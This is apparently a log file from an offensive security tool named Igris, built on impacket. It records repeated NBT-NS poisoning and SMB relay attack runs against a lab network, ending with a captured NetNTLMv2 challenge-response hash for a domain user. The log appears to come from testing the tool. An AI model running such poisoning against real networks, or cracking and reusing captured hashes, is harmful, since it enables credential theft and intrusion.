2021-12-04 18:06:24.971 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:06:44.480 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:07:28.778 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:07:28.785 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:07:28.785 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:07:28.789 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:07:28.790 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:07:28.794 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:09:00.774 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:09:05.708 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:09:05.714 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 18:09:05.715 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:09:05.718 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:09:05.718 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:09:05.719 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:09:21.265 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:09:42.185 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:09:42.189 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 18:09:42.189 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:09:42.193 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:09:42.199 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:09:42.200 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:09:52.502 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 18:09:52.529 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,49829)
2021-12-04 18:09:52.540 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 18:09:52.555 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-12-04 18:09:52.556 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-12-04 18:09:52.559 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:d0daaa421f8d0ad37e8917ce525b5340:0101000000000000009816223ae9d701c185f9318f04a5d400000000010010006400670068006c004100620064007700030010006400670068006c004100620064007700020010004100760050006e006a00510075005100040010004100760050006e006a0051007500510007000800009816223ae9d70106000400020000000800300030000000000000000100000000200000af44d7f9c3ab608386743dc72c616af977f08d4be4b3d674f7e715ca02e8be830a0010000000000000000000000000000000000009001a0063006900660073002f0061006e007300690065006400610064000000000000000000
2021-12-04 18:09:52.586 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
2021-12-04 18:09:52.603 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
2021-12-04 18:09:53.015 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-12-04 18:09:57.636 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
